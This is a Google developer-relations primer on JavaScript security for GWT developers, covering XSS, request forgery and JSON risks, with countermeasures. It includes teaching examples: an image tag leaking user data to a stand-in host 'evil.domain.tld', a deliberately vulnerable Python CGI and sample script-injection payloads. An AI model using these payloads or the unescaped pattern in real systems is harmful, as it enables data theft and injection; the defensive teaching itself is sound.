Security
===

_Dan Morrill, Google Developer Relations Team_

_Updated January 2009_

It is a sad truth that JavaScript applications are easily left vulnerable to several types of security exploits, if developers are unwary. Because the GWT produces JavaScript code, we GWT developers are no less vulnerable to JavaScript attacks than anyone else. However, because the goal of GWT is to allow developers to focus on their users' needs instead of JavaScript and browser quirks, it's easy to let our guards down. To make sure that GWT developers have a strong appreciation of the risks, we've put together this article.

GWT's mission is to provide developers with the tools they need to build AJAX apps that make the web a better place for end users. However, the apps we build have to be _secure_ as well as functional, or else our community isn't doing a very good job at our mission.

This article is a primer on JavaScript attacks, intended for GWT developers. The first portion describes the major classes of attacks against JavaScript in general terms that are applicable to any AJAX framework. After that background information on the attacks, the second portion describes how to secure your GWT applications against them.

1.  [Part 1: JavaScript Vulnerabilities](#vulnerabilities)
    1.  [Leaking Data](#leaking)
    2.  [Cross-Site Scripting](#cross-site)
    3.  [Forging Requests](#forging)
    4.  [JSON and XSRF](#json-xsrf)
2.  [Part 2: How GWT Developers Can Fight Back](#fight)
    1.  [XSS and GWT](#xss)
    2.  [XSRF and GWT](#xsrf)
    3.  [JSON and GWT](#json)
3.  [Conclusion](#conclusion)

## Part 1: JavaScript Vulnerabilities <a id="vulnerabilities"></a>

These problems, like so many others on the Internet, stem from malicious programmers. There are people out there who spend a huge percentage of their lives thinking of creative ways to steal your data. Vendors of web browsers do their part to stop those people, and one way they accomplish it is with the Same-Origin Policy.

The [Same-Origin Policy](http://en.wikipedia.org/wiki/Same_origin_policy) (SOP) says that code running in a page that was loaded from Site A can't access data or network resources belonging to any other site, or even any other page (unless that other page was also loaded from Site A.) The goal is to prevent malicious hackers from injecting evil code into Site A that gathers up some of your private data and sends it to their evil Site B. This is, of course, the well-known restriction that prevents your AJAX code from making an [XMLHTTPRequest](http://www.w3.org/TR/XMLHttpRequest/#introduction) call to a URL that isn't on the same site as the current page. Developers familiar with Java Applets will recognize this as a very similar security policy.

There is, however, a way around the Same-Origin Policy, and it all starts with trust. A web page owns its own data, of course, and is free to submit that data back to the web site it came from. JavaScript code that's already running is trusted to not be evil, and to know what it's doing. If code is already running, it's too late to stop it from doing anything evil anyway, so you might as well trust it.

One thing that JavaScript code is trusted to do is load more content. For example, you might
build a basic image gallery application by writing some JavaScript code that inserts and deletes
`<img>` tags into the current page. When you insert an `<img>` tag, the browser
immediately loads the image as if it had been present in the original page; if you delete (or
hide) an `<img>` tag, the browser removes it from the display.

Essentially, the SOP lets JavaScript code do anything that the original HTML page could have done &mdash; it just prevents that JavaScript from sending data to a different server, or from reading or writing data belonging to a different server.

### Leaking Data <a id="leaking"></a>

The text above said, "prevents JavaScript from sending data to a different server." Unfortunately, that's not strictly true. In fact it is possible to send data to a different server, although it might be more accurate to say "leak."

JavaScript is free to add new resources &mdash; such as `<img>` tags &mdash; to the current page. You
probably know that you can cause an image hosted on foo.com to appear inline in a page served up by bar.com. Indeed, some people get upset if you do this to their images, since it uses their bandwidth to serve an image to your web visitor. But, it's a feature of HTML, and since HTML can do it, so can JavaScript.

Normally you would view this as a read-only operation: the browser requests an image, and the server sends the data. The browser didn't upload anything, so no data can be lost, right? Almost, but not quite. The browser _did_ upload something: namely, the URL of the image. Images use standard URLs, and any URL can have query parameters encoded in it. A legitimate use case for this might be a page hit counter image, where a CGI on the server selects an appropriate image based on a query parameter and streams the data to the user in response. Here is a reasonable (though hypothetical) URL that could return a hit-count image showing the number '42':

```text
http://site.domain.tld/pagehits?count=42
```

In the static HTML world, this is perfectly reasonable. After all, the server is not going to
send the client to a web site that will leak the server's or user's data &mdash; at least, not on
purpose. Because this technique is legal in HTML, it's also legal in JavaScript, but there is an
unintended consequence. If some evil JavaScript code gets injected into a good web page, it can
construct `<img>` tags and add them to the page.

It is then free to construct a URL to any hostile domain, stick it in an `<img>` tag, and
make the request. It's not hard to imagine a scenario where the evil code steals some useful
information and encodes it in the `<img>` URL; an example might be a tag such as:

```html
<img src="http://evil.domain.tld/pagehits?private_user_data=12345"/>
```

If `private_user_data` is a password, credit card number, or something similar, there'd be a major problem. If the evil code sets the size of the image to 1 pixel by 1 pixel, it's very unlikely the user will even notice it.

### Cross-Site Scripting <a id="cross-site"></a>

The type of vulnerability just described is an example of a class of attacks called "Cross-Site
Scripting" (abbreviated as "XSS"). These attacks involve browser script code that transmits data
(or does even worse things) across sites. These attacks are not limited to `<img>` tags,
either; they can be used in most places the browser lets script code access URLs.
Here are some more examples of XSS attacks:

*   **Evil code creates a hidden iframe and then adds a `<form>` to it**. The form's action
is set to a URL on a server under the attacker's control. It then fills the form with hidden fields containing information taken from the parent page, and then submits the form.
*   **Evil code creates a hidden iframe, constructs a URL with query parameters** containing information taken from the parent page, and then sets the iframe's "src" to a URL on a server under the attacker's control.
*   **Evil code creates a `<script>` tag**, which functions almost identically to the
`<img>` attack. (Actually, it's a lot worse, as I'll explain in a later section.)

Clearly, if evil code gets into your page, it can do some nasty stuff. By the way, don't take my
examples above as a complete list; there are far too many variants of this trick to describe here.

Throughout all this there's a really big assumption, though: namely, that evil JavaScript code
could get itself into a good page in the first place. This sounds like it should be hard to do;
after all, servers aren't going to intentionally include evil code in the HTML data they send to
web browsers. Unfortunately, it turns out to be quite easy to do if the server (and sometimes
even client) programmers are not constantly vigilant. And as always, evil people are spending h
uge chunks of their lives thinking up ways to do this.

The list of ways that evil code can get into an otherwise good page is endless. Usually they all boil down to unwary code that parrots user input back to the user. For instance, this Python CGI code is vulnerable:

```python
import cgi
f = cgi.FieldStorage()
name = f.getvalue('name') or 'there'

s = '<html><body><div>Hello, ' + name + '!</div></body></html>'

print 'Content-Type: text/html'
print 'Content-Length: %s' % (len(s),)
print
print s
```

The code is supposed to print a simple greeting, based on a form input. For instance, a URL like this one would print "Hello, Dan!":

```text
http://site.domain.tld/path?name=Dan
```

However, because the CGI doesn't inspect the value of the "name" variable, an attacker can insert script code in there.

Here is some JavaScript that pops up an alert window:

```html
<script>alert('Hi');</script>
```

That script code can be encoded into a URL such as this:

```text
http://site.domain.tld/path?name=Dan%3Cscript%20%3Ealert%28%22Hi%22%29%3B%3C/script%3E
```

That URL, when run against the CGI above, inserts the `<script>`tag directly into the `<div>`block in the generated HTML. When the user loads the CGI page, it still says "Hello, Dan!" but it also pops up a JavaScript alert window.

It's not hard to imagine an attacker putting something worse than a mere JavaScript alert in that URL. It's also probably not hard to imagine how easy it is for your real-world, more complex server-side code to accidentally contain such vulnerabilities. Perhaps the scariest thing of all is that an evil URL like the one above can exploit your servers entirely without your involvement.

The solution is usually simple: you just have to make sure that you escape or strip the content any time you write user input back into a new page. Like many things though, that's easier said than done, and requires constant vigilance.

### Forging Requests <a id="forging"></a>

It would be nice if we could wrap up this article at this point. Unfortunately, we can't. You see, there's a whole other class of attack that we haven't covered yet.

You can think of this one almost as XSS in reverse. In this scenario, the attacker lures one of your users to _their own site_, and uses their browser to attack _your server_. The key to this attack is insecure server-side session management.

Probably the most common way that web sites manage sessions is via browser cookies. Typically the server will present a login page to the user, who enters credentials like a user name and password and submits the page. The server checks the credentials and if they are correct, sets a browser session cookie. Each new request from the browser comes with that cookie. Since the server knows that no other web site could have set that cookie (which is true due to the browsers' Same-Origin Policy,) the server knows the user has previously authenticated.

The problem with this approach is that session cookies don't expire when the user leaves the site (they expire either when the browser closes or after some period of time). Since the browsers will include cookies with any request to your server regardless of context, if your users are logged in, it's possible for other sites to trigger an action on your server. This is frequently referred to as "Cross-Site Request Forging" or XSRF (or sometimes CSRF).

The sites most vulnerable to XSRF attacks, perhaps ironically, are those that have already embraced the service-oriented model. Traditional non-AJAX web applications are HTML-heavy and require multi-page UI operations by their very nature. The Same-Origin Policy prevents an XSRF attacker from _reading_ the results of its request, making it impossible for an XSRF attacker to navigate a multi-page process. The simple technique of requiring the user to click a confirmation button &mdash; when properly implemented &mdash; is enough to foil an XSRF attack.

Unfortunately, eliminating those sorts of extra steps is one of the key goals of the AJAX programming model. AJAX lets an application's UI logic run in the browser, which in turn lets communications with the server become narrowly defined operations. For instance, you might develop corporate HR application where the server exposes a URL that lets browser clients email a user's list of employee data to someone else. Such services are operation-oriented, meaning that a single HTTP request is all it takes to do something.

Since a single request triggers the operation, the XSRF attacker doesn't need to see the response from an XMLHTTPRequest-style service. An AJAX-based HR site that exposes "Email Employee Data" as such a service could be exploited via an XSRF attack that carefully constructed a URL that emails the employee data to an attacker. As you can see, AJAX applications are a lot more vulnerable to an XSRF attack than a traditional web site, because the attacking page doesn't need to navigate a multi-page sequence after all.

### JSON and XSRF <a id="json-xsrf"></a>

So far we've seen the one-two punch from XSS and XSRF. Sadly, there's _still_ more. These days, JSON (JavaScript Object Notation) is the new hotness &mdash; and indeed, it's very hot. It's a clever, even elegant, technique. It also performs well, since it uses low-level (meaning: fast) browser support to handle parsing. It's also easy to program to, since the result is a JavaScript object, meaning you get object serialization almost for free. Unfortunately, with this powerful technique comes very substantial risks to your code; if you choose to use JSON with your GWT application, it's important to understand those risks.

At this point, you'll need to understand JSON; check out the [json.org](http://json.org) site if you aren't familiar with it yet. A cousin of JSON is "JSON with Padding" or JSONP, so you'll also want to be familiar with that. Here's the earliest discussion of JSONP that we could find: [Remote JSON - JSONP](http://bob.pythonmac.org/archives/2005/12/05/remote-json-jsonp/).

As bad as XSS and XSRF are, JSON gives them room to breathe, so to speak, which makes them even more dangerous. The best way to explain this is just to describe how JSON is used. There are three forms, and each is vulnerable to varying degrees:

*   A JSON string returned as the response text from an XMLHTTPRequest call (or other request)

    Examples:

    * ` [ 'foo', 'bar' ]`

    * ` { 'data': ['foo', 'bar'] }`

    Typically these strings are parsed via a call to JavaScript's 'eval' function for fast decoding.

*   A string containing a JSON object assigned to a variable, returned by a server as the response to a `<script>`tag.

    Example:

    ` var result = { 'data': ['foo', 'bar'] };`

*   A string containing a JSON object passed as the parameter to a function call &mdash; that is, the JSONP model.

   Example:

   ` handleResult({'data': ['foo', 'bar']});`

The last two examples are most useful when returned from a server as the response to a `<script>`tag inclusion. This could use a little explanation. Earlier text described how JavaScript is permitted to dynamically add `<img>`tags pointing to images on remote sites. The same is true of `<script>`tags: JavaScript code can dynamically insert new `<script>` tags that cause more JavaScript code to load.

This makes dynamic `<script>` insertion a very useful technique, especially for mashups. Mashups frequently need to fetch data from different sites, but the Same-Origin Policy prevents them from doing so directly with an XMLHTTPRequest call. However, currently-running JavaScript code is trusted to load new JavaScript code from different sites &mdash; and who says that code can't actually be data?

This concept might seem suspicious at first since it seems like a violation of the Same-Origin restriction, but it really isn't. Code is either trusted or it's not. Loading more code is more dangerous than loading data, so since your current code is already trusted to load more code, why should it not be trusted to load data as well? Meanwhile, `<script>` tags can only be inserted by trusted code in the first place, and the entire meaning of trust is that... you trust it to know what it's doing. It's true that XSS can abuse trust, but ultimately XSS can only originate from buggy server code. Same-Origin is based on trusting the server &mdash; bugs and all.

So what does this mean? How is writing a server-side service that exposes data via these methods vulnerable? Well, other people have explained this a lot better than we can cover it here. Here are some good treatments:

*   [JSON is not as safe as people think it is](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)
*   [Safe JSON](http://robubu.com/?p=24)

Go ahead and read those &mdash; and be sure to follow the links! Once you've digested it all, you'll probably see that you should tread carefully with JSON &mdash; whether you're using GWT or another tool.

## Part 2: How GWT Developers Can Fight Back <a id="fight"></a>

But this is an article for GWT developers, right? So how are GWT developers affected by these things? The answer is that we are no less vulnerable than anybody else, and so we have to be just as careful. The sections below describe how each threat impacts GWT in detail.

### XSS and GWT <a id="xss"></a>

  Also see [SafeHtml](../doc/latest/DevGuideSecuritySafeHtml.html) &mdash; Provides coding guidelines with examples showing how to protect your application from XSS vulnerabilities due to untrusted data

XSS can be avoided if you rigorously follow good JavaScript programming practices. Since GWT helps you follow good JavaScript practices in general, it can help you with XSS. However, GWT developers are not immune, and there simply is no magic bullet.

Currently, we believe that GWT isolates your exposure to XSS attacks to these vectors:

*   JavaScript on your host page that is unrelated to GWT
*   Code you write that sets `innerHTML` on GWT Widget objects
*   Using the JSON API to parse untrusted strings (which ultimately calls JavaScript's eval function)
*   [JavaScript Native Interface (JSNI)](../doc/latest/DevGuideCodingBasicsJSNI.html "JavaScript Native Interface (JSNI)") code that you write that does something unsafe (such as setting innerHTML, calling eval, writing directly to the document via `document.write`, etc.)

Don't take our word for it, though! Nobody's perfect, so it's important to always keep security on your mind. Don't wait until your security audit finds a hole, think about it constantly as you code.

Read on for more detail on the four vectors above.

#### Non-GWT JavaScript <a id="non-gwt"></a>

Many developers use GWT along with other JavaScript solutions. For instance, your application might be using a mashup with code from several sites, or you might be using a third-party JavaScript-only library with GWT. In these cases, your application could be vulnerable due to those non-GWT libraries, even if the GWT portion of your application is secure.

If you are mixing other JavaScript code with GWT in your application, it's important that you review all the pieces to be sure your entire application is secure.

#### Code that sets innerHTML <a id="innerhtml"></a>

It's a common technique to fill out the bodies of tables, DIVs, frames, and similar UI elements with some static HTML content. This is most easily accomplished by assigning to the innerHTML attribute on a JavaScript object. However, this can be risky since it allows evil content to get inserted directly into a page.

Here's an example. Consider this basic JavaScript page:

```html
<html>
<head>
  <script language="JavaScript">
    function fillMyDiv(newContent) {
      document.getElementById('mydiv').innerHTML = newContent;
    }
  </script>
</head>
<body>
  <p>Some text before mydiv.</p>
  <div id="mydiv"></div>
  <p>Some text after mydiv.</p>
</body>
</html>
```

The page contains a placeholder `<div>` named 'mydiv', and a JavaScript function that simply sets innerHTML on that div. The idea is that you would call that function from other code on your page whenever you wanted to update the content being displayed. However, suppose an attacker contrives to get a user to pass in this HTML as the 'newContent' variable: `<div onmousemove="alert('Hi!');">Some text</div>`

Whenever the user mouses over 'mydiv', an alert will appear. If that's not frightening enough, there are other techniques &mdash; only slightly more complicated &mdash; that can execute code immediately without even needing to wait for user input. This is why setting innerHTML can be dangerous; you've got to be sure that the strings you use are trusted.

It's also important to realize that a string is not necessarily trusted just because it comes from your server! Suppose your application contains a report, which has "edit" and "view" modes in your user interface. For performance reasons, you might generate the custom-printed report in plain-old HTML on your server. Your GWT application would display it by using a `RequestCallback` to fetch the HTML and assign the result to a table cell's innerHTML property. You might assume that that string is trusted since your server generated it, but that could be a bad assumption. If the user is able to enter arbitrary input in "edit" mode, an attacker could use any of a variety of attacks to get the user to store some unsafe HTML in a record. When the user views the record again, that record's HTML would be evil.

Unless you do an extremely thorough analysis of both the client and server, you can't assume a string from your server is safe. To be truly safe, you may want to always assume that strings destined for innerHTML or eval are unsafe, but at the very least you've got to Know Your Code.

#### Parsing JSON Strings <a id="parsing-json"></a>

This is a very similar scenario to setting innerHTML, although with arguably worse implications. Suppose that you have the same example as the one just described, except that instead of returning HTML content, the server sends the report data to the browser as a JSON string. You would normally pass that string to GWT's JSONParser class. For performance reasons, though, that string calls eval(). It's important to be sure that the code you are passing doesn't contain evil code.

An attacker could again use one of several attacks to cause the user to save carefully-constructed JavaScript code into one of your data records. That code could contain evil side effects that take effect immediately when the JSON object is parsed. This is just as severe as innerHTML but is actually easier to do since the attacker doesn't need to play tricks with HTML in the evil string &mdash; he can just use plain JavaScript code.

As with innerHTML, it's not always correct to assume that a JSON string is safe simply because it came from your server. At the very least, it is important to think carefully before you use any JSON service, whether it's yours or a third party's.

#### Your Own JSNI Code <a id="jsni"></a>

GWT has little control over or insight into JSNI code you write. If you write JSNI code, it's important to be especially cautious. Calling the eval function or setting innerHTML should set off red flags immediately, but you should always think carefully as you write code.

For instance, if you're writing a custom Widget that includes a hyperlink, you might include a `setURL(String)` method. If you do, though, you should consider adding a test to make sure that the new URL data doesn't actually contain a `"javascript:"` URL. Without this test, your setURL method could create a new vector for XSS code to get into your application. This is just one possible example; always think carefully about unintended effects when you use JSNI.

#### Protecting Your Application <a id="protecting"></a>

As a GWT user, you can help reduce XSS vulnerabilities in your code by following these guidelines:

*   Carefully inspect and strip or escape any strings you assign to innerHTML using GWT code
*   Carefully inspect any JavaScript strings you pass to GWT's JSON parser
*   Carefully inspect any strings you pass to eval or assign to innerHTML via a JSNI method
*   Take care in your native JSNI methods to not do anything that would expose you to attacks

The GWT team is considering adding support for standard string inspection to the GWT library. You would use this to validate any untrusted string to determine if it contains unsafe data (such as a `<script>` tag.) The idea is that you'd use this method to help you inspect any strings you need to pass to innerHTML or eval. However, this functionality is only being considered right now, so for the time being it's still important to do your own inspections. Be sure to follow the guidelines above &mdash; and be sure to be paranoid!

### XSRF and GWT <a id="xsrf"></a>

  Also see [GWT RPC XSRF protection](../doc/latest/DevGuideSecurityRpcXsrf.html) &mdash; Explains how to protect GWT RPCs against XSRF attacks using RPC tokens introduced in GWT 2.3.

You can take steps to make your GWT application less vulnerable to XSRF attacks. The same techniques that you might use to protect other AJAX code will also work to protect your GWT application.

A common countermeasure for XSRF attacks involves duplicating a session cookie. Earlier, we discussed how the usual cookie-based session management model leaves your application open to XSRF attacks. An easy way to prevent this is to use JavaScript to copy the cookie value and submit it as form data along with your XMLHTTPRequest call. Since the browser's Same-Origin Policy will prevent a third-party site from accessing the cookies from your site, only your site can retrieve your cookie. By submitting the value of the cookie along with the request, your server can compare the actual cookie value with the copy you included; if they don't match, your server knows that the request is an XSRF attempt. Simply put, this technique is a way of requiring the code that made the request to prove that it has access to the session cookie.

#### Protecting Your Application

If you are using the [RequestBuilder](/javadoc/latest/com/google/gwt/http/client/RequestBuilder.html) and [RequestCallback](/javadoc/latest/com/google/gwt/http/client/RequestCallback.html) classes in GWT, you can implement XSRF protection by setting a custom header to contain the value of your cookie. Here is some sample code:

```java
RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, url);
rb.setHeader("X-XSRF-Cookie", Cookies.getCookie("myCookieKey"));
rb.sendRequest(null, myCallback);
```

If you are using GWT's RPC mechanism, the solution is unfortunately not quite as clean. However, there are still several ways you can accomplish it. For instance, you can add an argument to each method in your [RemoteService](/javadoc/latest/com/google/gwt/user/client/rpc/RemoteService.html) interface that contains a String. That is, if you wanted this interface:

```java
public interface MyInterface extends RemoteService {
  public boolean doSomething();
  public void doSomethingElse(String arg);
}
```

...you could actually use this:

```java
public interface MyInterface extends RemoteService {
  public boolean doSomething(String cookieValue);
  public void doSomethingElse(String cookieValue, String arg);
}
```

When you call the method, you would pass in the current cookie value that you fetch using `Cookies.getCookie(String)`.

If you prefer not to mark up your `RemoteService` interfaces in this way, you can do other things instead. You might modify your data-transfer objects to have a field name containing the `cookieValue`, and set that value whenever you create them. Perhaps the simplest solution is to simply add the cookie value to your URL as a `GET` parameter. The important thing is to get the cookie value up to the server, somehow.

In all of these cases, of course, you'll have to have your server-side code compare the duplicate value with the actual cookie value and ensure that they're the same.

The GWT team is also considering enhancing the RPC system to make it easier to prevent XSRF attacks. Again though, that will only appear in a future version, and for now you should take precautions on your own.

### JSON and GWT <a id="json"></a>

#### Protecting Your Single-Site Application

Attacks against JSON and JSONP are pretty fundamental. Once the browser is running the code, there's nothing you can do to stop it. The best way to protect your server against JSON data theft is to avoid sending JSON data to an attacker in the first place.

That said, some people advise JSON developers to employ an extra precaution besides the cookie duplication XSRF countermeasure. In this model, your server code would wrap any JSON response strings within JavaScript block comments. For example, instead of returning `['foo', 'bar']` you would instead return `/*['foo', 'bar']*/`.

The client code is then expected to strip the comment characters prior to passing the string to the eval function.

The primary effect of this is that it prevents your JSON data from being stolen via a `<script>` tag. If you normally expect your server to export JSON data in response to a direct XMLHTTPRequest, this technique would prevent attackers from executing an XSRF attack against your server and stealing the response data via one of the attacks linked to earlier.

If you only intend your JSON data to be returned via an XMLHTTPRequest, wrapping the data in a block comment prevents someone from stealing it via a `<script>` tag. If you are using JSON as the data format exposed by your own services and don't intend servers in other domains to use it, then there is no reason not to use this technique. It might keep your data safe even in the event that an attacker manages to forge a cookie.

#### Protecting Your Mashup

You should also use the XSRF cookie-duplication countermeasure if you're exposing services for other mashups to use. However, if you're building a JSONP service that you want to expose publicly, the second comment-block technique we just described will be a hindrance.

The reason is that the comment-wrapping technique works by totally disabling support for `<script>` tags. Since that is at the heart of JSONP, it disables that technique. If you are building a web service that you want to be used by other sites for in-browser mashups, then this technique would prevent that.

Conversely, be very careful if you're building mashups with someone else's site! If your application is a "JSON consumer" fetching data from a different domain via dynamic `<script>` tags, you are exposed to any vulnerabilities they may have. If their site is compromised, your application could be as well. Unfortunately, with the current state of the art, there isn't much you can do about this. After all &mdash; by using a `<script>` tag, you're trusting their site. You just have to be sure that your trust is well-placed.

In other words, if you have critical private information on your own server, you should probably avoid in-browser JSONP-style mashups with another site. Instead, you might consider building your server to act as a relay or proxy to the other site. With that technique, the browser only communicates with your site, which allows you to use more rigorous protections. It may also provide you with an additional opportunity to inspect strings for evil code.

## Conclusion <a id="conclusion"></a>

Web 2.0 can be a scary place. Hopefully we've given you some food for thought and a few techniques you can implement to keep your users safe. Mostly, though, we hope we've instilled a good healthy dose of paranoia in you. If Benjamin Franklin were alive today, he might add a new "certainty" to his famous list: death, taxes... and people trying to crack your site. The only thing we can be sure of is that there will be other exploits in the future, so paranoia will serve you well over time.

As a final note, we'd like to stress one more time the importance of staying vigilant. This article is not an exhaustive list of the security threats to your application. This is just a primer, and someday it could become out of date. There may also be other attacks which we're simply unaware of. While we hope you found this information useful, the most important thing you can do for your users' security is to keep learning, and stay as well-informed as you can about security threats.

As always, if you have any feedback for us or would like to discuss this issue &mdash; now or in the future &mdash; please visit our [GWT Developer Forum](http://groups.google.com/group/Google-Web-Toolkit).
